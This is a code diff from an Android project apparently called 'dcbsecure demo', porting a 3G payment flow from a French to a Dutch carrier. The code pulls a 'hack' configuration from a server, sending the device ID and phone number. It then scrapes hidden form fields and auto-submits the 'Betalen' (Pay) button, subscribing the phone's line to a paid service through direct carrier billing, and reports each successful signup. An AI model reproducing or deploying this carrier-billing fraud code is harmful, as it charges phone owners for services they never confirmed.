@@ -1,17 +1,20 @@
-package com.dcbsecure.demo201503.dcbsecure.flow;
+package com.dcbsecure.demo201503.dcbsecure.flow.NL;
 
+import android.app.ProgressDialog;
 import android.content.Context;
 import android.os.Handler;
 import android.os.Message;
 import android.telephony.TelephonyManager;
 import android.util.Log;
-import android.view.View;
 
+import android.view.View;
+import android.widget.Button;
 import com.dcbsecure.demo201503.dcbsecure.ActivityMainWindow;
+import com.dcbsecure.demo201503.dcbsecure.flow.FlowUtil;
 import com.dcbsecure.demo201503.dcbsecure.managers.ConfigMgr;
 import com.dcbsecure.demo201503.dcbsecure.managers.PreferenceMgr;
+import com.dcbsecure.demo201503.dcbsecure.R;
 import com.dcbsecure.demo201503.dcbsecure.request.RequestResult;
-import com.dcbsecure.demo201503.dcbsecure.util.PayUtil;
 import com.dcbsecure.demo201503.dcbsecure.util.SyncRequestUtil;
 import com.dcbsecure.demo201503.dcbsecure.managers.TrackMgr;
 import com.loopj.android.http.PersistentCookieStore;
@@ -33,31 +36,30 @@ import java.net.URI;
 import java.net.URISyntaxException;
 import java.util.ArrayList;
 import java.util.Arrays;
-import java.util.regex.Matcher;
-import java.util.regex.Pattern;
 
 
-public class FlowFRBouygues3G implements View.OnClickListener
+public class FlowNL3G implements View.OnClickListener
 {
     private final ActivityMainWindow activityMainWindow;
+    private final Button btnStart;
 
-    public FlowFRBouygues3G(ActivityMainWindow activityMainWindow)
+    public FlowNL3G(ActivityMainWindow activityMainWindow, Button btnStart)
     {
         this.activityMainWindow = activityMainWindow;
+        this.btnStart = btnStart;
     }
+
 
     @Override
     public void onClick(View v)
     {
-        onClick();
-    }
-
-    public void onClick()
-    {
-        Log.d("FLIRTY", "Started handling payment over 3G");
-
+        Log.d("DCBSECURE", "Started handling payment over 3G");
+        btnStart.setVisibility(View.INVISIBLE);
 
         final String deviceid = ConfigMgr.lookupDeviceId(activityMainWindow);
+
+        final ProgressDialog progress = ProgressDialog.show(activityMainWindow, null, activityMainWindow.getString(R.string.processing) + " 0%");
+        progress.show();
 
         // used to dismiss the progress dialog
         final Handler handler = new Handler()
@@ -66,6 +68,17 @@ public class FlowFRBouygues3G implements View.OnClickListener
             public void handleMessage(final Message msg)
             {
                 super.handleMessage(msg);
+
+                if (msg.what == 0)
+                {
+                    progress.dismiss();
+                }
+
+                if(msg.what >0)
+                {
+                    // start the waiting task
+                    progress.setMessage(activityMainWindow.getString(R.string.processing)+" "+msg.what+"%");
+                }
             }
         };
 
@@ -93,11 +106,10 @@ public class FlowFRBouygues3G implements View.OnClickListener
                     params.add(new BasicNameValuePair("carrier", carrier));
                     long msisdn = ConfigMgr.lookupMsisdnFromTelephonyMgr(activityMainWindow);
                     if(msisdn>0) params.add(new BasicNameValuePair("msisdn", ""+msisdn));
-
-                    params.add(new BasicNameValuePair("wifi", PayUtil.isUsingMobileData(activityMainWindow) ? "0" : "1"));
+                    params.add(new BasicNameValuePair("wifi", FlowUtil.isUsingMobileData(activityMainWindow) ? "0" : "1"));
 
                     String userAgent = PreferenceMgr.getUserAgent(activityMainWindow);
-                    JSONObject hackConfigResponse = SyncRequestUtil.doSynchronousHttpPostReturnsJson(ConfigMgr.getString(activityMainWindow, "SERVER") + "/api/hack/lookup", params, userAgent);
+                    JSONObject hackConfigResponse = SyncRequestUtil.doSynchronousHttpPostReturnsJson(ConfigMgr.getString(activityMainWindow, "SERVER") + "/api/hack/lookup", params, userAgent, activityMainWindow);
                     if (hackConfigResponse == null)
                     {
                         TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, 0, 0, true, "hack could not read config", "deviceid:" + deviceid);
@@ -113,7 +125,7 @@ public class FlowFRBouygues3G implements View.OnClickListener
                 catch (JSONException e)
                 {
                     TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, true, "Could not read hack config", "deviceid:" + ConfigMgr.lookupDeviceId(activityMainWindow));
-                    Log.d("FLIRTY", "Could not read hack config");
+                    Log.d("DCBSECURE", "Could not read hack config");
                     handler.sendEmptyMessage(0);
                 }
                 catch (Exception e)
@@ -121,7 +133,7 @@ public class FlowFRBouygues3G implements View.OnClickListener
                     String stack = TrackMgr.getStackAsString(e);
                     String message = "unexpected exception deviceid:" + ConfigMgr.lookupDeviceId(activityMainWindow);
                     TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, true, message, stack);
-                    Log.d("FLIRTY", message + " exception:" + e.getClass().getName() + " " + e.getMessage());
+                    Log.d("DCBSECURE", message + " exception:" + e.getClass().getName() + " " + e.getMessage());
                     handler.sendEmptyMessage(0);
                 }
 
@@ -131,6 +143,7 @@ public class FlowFRBouygues3G implements View.OnClickListener
     }
 
     private void runFlowNotInMainThread(JSONObject hackConfig, final String deviceid, final long runid, final Handler handler)
+            throws Exception
     {
         final String userAgent = PreferenceMgr.getUserAgent(activityMainWindow);
 
@@ -147,23 +160,9 @@ public class FlowFRBouygues3G implements View.OnClickListener
             return;
         }
 
-
-        activityMainWindow.updateLogs("\nAccessing content page : " + startUrl);
-        final RequestResult resultAfterStart = SyncRequestUtil.doSynchronousHttpGetCallReturnsString(activityMainWindow, startUrl, userAgent);
+        final RequestResult resultAfterStart = doSynchronousHttpGetCallReturnsString(activityMainWindow, startUrl, userAgent);
         String htmlDataConfirm = resultAfterStart!=null?resultAfterStart.getContent():null;
-
-        String confirmUrl = null;
-        if(resultAfterStart!=null){
-            Pattern pattern = Pattern.compile("<form method=\"POST\" action=\"(.*/variablebilling.*)\"><input type=\"hidden\" name=\"ok\"");
-            Matcher matcher = pattern.matcher(htmlDataConfirm);
-            boolean matchFound = matcher.find();
-
-            if(matchFound){
-                Log.d("FLIRTY", "FOUND");
-                activityMainWindow.updateLogs("Confirmation form found");
-                confirmUrl = matcher.group(1);
-            }
-        }
+        String confirmUrl = resultAfterStart!=null?resultAfterStart.getUrl():null;
 
         if(resultAfterStart==null)
         {
@@ -186,21 +185,21 @@ public class FlowFRBouygues3G implements View.OnClickListener
             handler.sendEmptyMessage(0); //kill the waiting message
             return;
         }
-        else if(!htmlDataConfirm.contains("Confirmer"))
+        else if(!htmlDataConfirm.contains("Betalen"))
         {
             String subject = "expected confirm page does not look right";
             TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, true, subject,htmlDataConfirm);
             handler.sendEmptyMessage(0); //kill the waiting message
             return;
         }
-        else //if contains "Confirmer"
+        else //if contains "Betalen"
         {
-            activityMainWindow.updateLogs("Calling payment page : " + confirmUrl);
-            final ArrayList<NameValuePair> paramsForConfirm = new ArrayList();
-            paramsForConfirm.add(new BasicNameValuePair("ok", "OK"));
+            final ArrayList<NameValuePair> paramsForConfirm = buildArrayListParamsOfHiddenFields(htmlDataConfirm.split("\n"));
+            paramsForConfirm.add(new BasicNameValuePair("ctl00$ContentPlaceHolder1$subscriptionAgreeButton", "Betalen"));
+            paramsForConfirm.add(new BasicNameValuePair("ContentPlaceHolder1_subscriptionAgreeButton", "Betalen"));
 
             // Here we have to make one last POST request to confirm
-            final RequestResult resultAfterConfirm = SyncRequestUtil.doSynchronousHttpPost(confirmUrl.replace("&amp;", "&"), paramsForConfirm,userAgent);
+            final RequestResult resultAfterConfirm = SyncRequestUtil.doSynchronousHttpPost(confirmUrl, paramsForConfirm,userAgent,activityMainWindow);
             final String successfulConfirmationUrl = resultAfterConfirm!=null?resultAfterConfirm.getUrl():null;
             final String htmlDataAfterConfirm = resultAfterConfirm!=null?resultAfterConfirm.getContent():null;
 
@@ -218,22 +217,38 @@ public class FlowFRBouygues3G implements View.OnClickListener
                 handler.sendEmptyMessage(0);
                 return;
             }
-            else if(successfulConfirmationUrl!=null && successfulConfirmationUrl.contains("google.fr"))
+            else if(htmlDataAfterConfirm.contains("action=\"SuccessfulConfirmation.aspx\""))
             {
-                activityMainWindow.updateLogs("\nPayment success !");
-                String subject = "successful signup on 3G flow";
-                TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 1, false, subject, htmlDataAfterConfirm);
+                final ArrayList<NameValuePair> paramsForSuccessfulConfirmation = buildArrayListParamsOfHiddenFields(htmlDataAfterConfirm.split("\n"));
+
+                //follow succesful confirmation link
+                final RequestResult resultAfterSuccessfulConfirmation = SyncRequestUtil.doSynchronousHttpPost(successfulConfirmationUrl, paramsForSuccessfulConfirmation, userAgent, activityMainWindow);
+                final String htmlDataAfterSuccessfulConfirmation = resultAfterSuccessfulConfirmation!=null?resultAfterSuccessfulConfirmation.getContent():null;
+                final String flirtymobSuccessUrl = resultAfterSuccessfulConfirmation!=null?resultAfterSuccessfulConfirmation.getUrl():null;
+
+                if(flirtymobSuccessUrl!=null && flirtymobSuccessUrl.contains("flirtymob.com"))
+                {
+                    String subject = "successful signup on 3G flow";
+                    TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 1, false, subject, htmlDataAfterSuccessfulConfirmation);
+                }
+                else
+                {
+                    //post warning
+                    String subject = "successful signup on 3G flow but wrong redirect after SuccessfulConfirmation.aspx";
+                    TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 1, false, subject, htmlDataAfterSuccessfulConfirmation);
+                }
+                handler.sendEmptyMessage(0);
+                return;
+
             }
             else
             {
-                activityMainWindow.updateLogs("\nPayment success !");
-                //post warning
-                String subject = "successful signup on 3G flow but wrong redirect after SuccessfulConfirmation.aspx ("+successfulConfirmationUrl+")";
-                TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, true, subject, htmlDataAfterConfirm);
+                String subject = "unexpected answer after confirm on 3G flow";
+                TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterConfirm);
+                handler.sendEmptyMessage(0);
+                return;
             }
-            handler.sendEmptyMessage(0);
-            return;
-       }
+        }
 
     }
 
@@ -253,7 +268,7 @@ public class FlowFRBouygues3G implements View.OnClickListener
             @Override
             public URI getLocationURI(HttpResponse httpResponse, HttpContext httpContext) throws ProtocolException
             {
-                Log.d("FLIRTY", Arrays.toString(httpResponse.getHeaders("Location")));
+                Log.d("DCBSECURE", Arrays.toString(httpResponse.getHeaders("Location")));
 
                 Header location = httpResponse.getFirstHeader("Location");
 
@@ -261,12 +276,12 @@ public class FlowFRBouygues3G implements View.OnClickListener
                 try {
                     String noWhiteSpaceLocation = currentUrl[0].replaceAll("\\s", "");
                     if (!currentUrl[0].equals(noWhiteSpaceLocation)) {
-                        Log.d("FLIRTY", "fixed redirect location (was:" + currentUrl[0] + ", now:" + noWhiteSpaceLocation + ")");
+                        Log.d("DCBSECURE", "fixed redirect location (was:" + currentUrl[0] + ", now:" + noWhiteSpaceLocation + ")");
                         return new URI(noWhiteSpaceLocation);
                     }
                 }
                 catch (URISyntaxException e) {
-                    Log.d("FLIRTY", e.getMessage());
+                    Log.d("DCBSECURE", e.getMessage());
                 }
 
                 //default
@@ -328,6 +343,5 @@ public class FlowFRBouygues3G implements View.OnClickListener
 
         return params;
     }
-
 
 }
